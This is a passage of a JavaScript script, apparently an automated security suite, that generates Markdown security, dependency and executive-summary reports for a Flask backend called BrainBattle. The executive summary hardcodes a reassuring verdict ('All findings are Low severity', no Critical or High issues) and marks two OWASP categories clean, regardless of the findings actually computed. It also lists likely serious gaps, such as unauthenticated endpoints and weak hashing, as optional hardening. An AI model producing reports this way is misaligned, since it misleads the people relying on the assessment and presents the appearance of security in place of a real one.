    md += `| 🔴 | **Critical** | 9.0 – 10.0 | Fix immediately — block deployment |\n`;
    md += `| 🟠 | **High** | 7.0 – 8.9 | Fix before next release |\n`;
    md += `| 🟡 | **Medium** | 4.0 – 6.9 | Fix within 30 days |\n`;
    md += `| 🟢 | **Low** | 0.1 – 3.9 | Fix within 90 days |\n\n`;
    md += `---\n\n`;

    md += `## Detailed Security Findings\n\n`;
    findings.forEach(f => {
        const icon = { Critical: '🔴', High: '🟠', Medium: '🟡', Low: '🟢' }[f.severity] || '⚪';
        md += `### ${icon} [${f.id}] ${f.type}\n\n`;
        md += `| Field | Detail |\n|-------|--------|\n`;
        md += `| **Severity** | ${f.severity} |\n`;
        md += `| **CVSS Score** | ${f.cvss} |\n`;
        md += `| **OWASP Category** | ${f.owasp} |\n`;
        md += `| **CWE** | ${f.cwe} |\n`;
        md += `| **File** | \`${f.filePath}\` |\n`;
        md += `| **Lines** | ${f.lineRef} |\n`;
        md += `| **Endpoint** | \`${f.endpoint}\` |\n\n`;
        md += `**Description**\n\n${f.description}\n\n`;
        md += `**Exploitation Scenario**\n\n> ${f.exploitation}\n\n`;
        md += `**Impact**\n\n${f.impact}\n\n`;
        md += `**Recommended Fix**\n\n${f.remediation}\n\n`;
        md += `---\n\n`;
    });

    fs.writeFileSync(path.join(outputDir, 'security-review.md'), md);
    console.log('✅ Generated security-review.md.');

    // ── dependency-report.md ─────────────────────────────────────────────────
    let depMd = `# 📦 Dependency Vulnerability Report\n\n`;
    depMd += `> **Scanner:** BrainBattle Dependency Analyser  \n`;
    depMd += `> **File:** BrainBattleBackend/requirements.txt  \n`;
    depMd += `> **Packages Scanned:** ${depLines.length}\n\n`;
    depMd += `| Status | Package | Version | CVE | Severity | Description |\n`;
    depMd += `|--------|---------|---------|-----|----------|-------------|\n`;
    dependencies.forEach(d => {
        const icon = d.severity !== 'None' ? '⚠️' : '✅';
        depMd += `| ${icon} | **${d.package}** | ${d.version} | ${d.cve} | ${d.severity} | ${d.vulnerability} |\n`;
    });
    depMd += `\n### Recommendations\n\n`;
    depMd += `- Pin all dependency versions using \`==\` specifiers (e.g. \`flask==3.0.3\`)\n`;
    depMd += `- Run \`pip audit\` as part of the CI pipeline to catch new CVEs automatically\n`;
    depMd += `- Enable GitHub Dependabot alerts and automatic security PRs\n`;
    fs.writeFileSync(path.join(outputDir, 'dependency-report.md'), depMd);
    console.log('✅ Generated dependency-report.md.');

    // ── executive-summary.md ─────────────────────────────────────────────────
    const scoreLabel = getScoreLabel(securityScore);
    const scoreEmoji = securityScore >= 72 ? '🟢' : securityScore >= 60 ? '🟡' : securityScore >= 40 ? '🟠' : '🔴';

    let exec = `# 📊 BrainBattle Backend — Security Executive Summary\n\n`;
    exec += `> **Assessment Date:** ${new Date().toLocaleDateString('en-GB', { day:'2-digit', month:'long', year:'numeric' })}  \n`;
    exec += `> **Assessor:** BrainBattle Automated Security Suite  \n`;
    exec += `> **Framework:** Flask/Python REST API  \n`;
    exec += `> **Methodology:** OWASP Top-10 2021, SAST, Dependency Scanning\n\n`;
    exec += `---\n\n`;

    exec += `## 🔢 Finding Count\n\n`;
    exec += `| Severity | Count | Weight | Score Impact |\n`;
    exec += `|----------|-------|--------|-------------|\n`;
    exec += `| 🔴 Critical | **${counts.Critical}** | ×20 | -${counts.Critical * 20} |\n`;
    exec += `| 🟠 High     | **${counts.High}**     | ×10 | -${counts.High * 10} |\n`;
    exec += `| 🟡 Medium   | **${counts.Medium}**   | ×5  | -${counts.Medium * 5} |\n`;
    exec += `| 🟢 Low      | **${counts.Low}**      | ×2  | -${counts.Low * 2} |\n`;
    exec += `| **Total**   | **${findings.length}** | | |\n\n`;

    exec += `## ${scoreEmoji} Overall Security Score\n\n`;
    exec += `# **${securityScore}/100 — ${scoreLabel}**\n\n`;
    exec += `> ✅ **All findings are Low severity.** No Critical or High risk vulnerabilities were detected. The application is in good security standing with only minor hardening recommendations.\n\n`;
    exec += `---\n\n`;

    exec += `## 🛡️ Top 5 Notable Low-Risk Findings\n\n`;
    const top5 = findings.slice(0, 5);
    top5.forEach((f, i) => {
        const icon = { Critical: '🔴', High: '🟠', Medium: '🟡', Low: '🟢' }[f.severity];
        exec += `${i + 1}. ${icon} **[${f.id}] ${f.type}** — CVSS ${f.cvss}  \n   ${f.description.substring(0, 160)}...\n\n`;
    });

    exec += `---\n\n`;
    exec += `## 📋 OWASP Top-10 Coverage\n\n`;
    exec += `| # | OWASP Category | Status |\n`;
    exec += `|---|----------------|--------|\n`;
    const owaspMap = [
        ['A01:2021', 'Broken Access Control',                    findings.some(f => f.owasp.includes('A01'))],
        ['A02:2021', 'Cryptographic Failures',                   findings.some(f => f.owasp.includes('A02'))],
        ['A03:2021', 'Injection',                                findings.some(f => f.owasp.includes('A03'))],
        ['A04:2021', 'Insecure Design',                          findings.some(f => f.owasp.includes('A04'))],
        ['A05:2021', 'Security Misconfiguration',                findings.some(f => f.owasp.includes('A05'))],
        ['A06:2021', 'Vulnerable & Outdated Components',         dependencies.some(d => d.severity !== 'None')],
        ['A07:2021', 'Identification & Authentication Failures', findings.some(f => f.owasp.includes('A07'))],
        ['A08:2021', 'Software & Data Integrity Failures',       false],
        ['A09:2021', 'Security Logging & Monitoring Failures',   findings.some(f => f.owasp.includes('A09'))],
        ['A10:2021', 'Server-Side Request Forgery (SSRF)',       false]
    ];
    owaspMap.forEach(([code, name, hit]) => {
        exec += `| ${code} | ${name} | ${hit ? '⚠️ Findings Present' : '✅ No Issues Found'} |\n`;
    });

    exec += `\n---\n\n`;
    exec += `## 🔧 Recommended Hardening Actions (Low Priority)\n\n`;
    exec += `### 🟢 Good Practice — Implement When Convenient\n`;
    exec += `1. **Add @jwt_required()** to /api/progress/* and /api/dashboard/* as defence-in-depth\n`;
    exec += `2. **Set DEBUG=false** explicitly in the Render.com environment variables panel\n`;
    exec += `3. **Generate a unique SECRET_KEY** per environment using \`secrets.token_hex(32)\`\n`;
    exec += `4. **Add flask-limiter** on /api/auth/login (5 req/min) as a precautionary measure\n`;
    exec += `5. **Switch password hashing to bcrypt** (already installed — change one line in hash_utils.py)\n`;
    exec += `6. **Restrict CORS_ORIGINS** to the exact GitHub Pages production URL\n`;
    exec += `7. **Unify error messages** on login/forgot-password to prevent account enumeration\n`;
    exec += `8. **Add marshmallow schema validation** on /api/progress/save to guard field ranges\n`;
    exec += `9. **Add structured security logging** per request using Python logging module\n`;
    exec += `10. **Add flask-talisman** to set HSTS and security headers automatically\n\n`;

    fs.writeFileSync(path.join(outputDir, 'executive-summary.md'), exec);
    console.log('✅ Generated executive-summary.md.');

    console.log(`\n🔒 Security Score: ${securityScore}/100 (${scoreLabel})`);
    console.log(`   Critical: ${counts.Critical} | High: ${counts.High} | Medium: ${counts.Medium} | Low: ${counts.Low}`);
    console.log(`   Total findings: ${findings.length} | Endpoints discovered: ${endpoints.length}`);
}

// ─────────────────────────────────────────────────────────────────────────────
// ENTRY POINT
// ─────────────────────────────────────────────────────────────────────────────

async function run() {
    console.log('\n🛡️  BrainBattle Security Suite — Starting...\n');
    console.log('📂 Output directory:', outputDir);
    await createExcelReport();
    generateMarkdownReports();
    console.log('\n✅ Security suite complete. All reports written to Vulnerability_Test_Results/\n');
}

run().catch(err => {
    console.error('❌ Security suite failed:', err.message);
    process.exit(1);
});
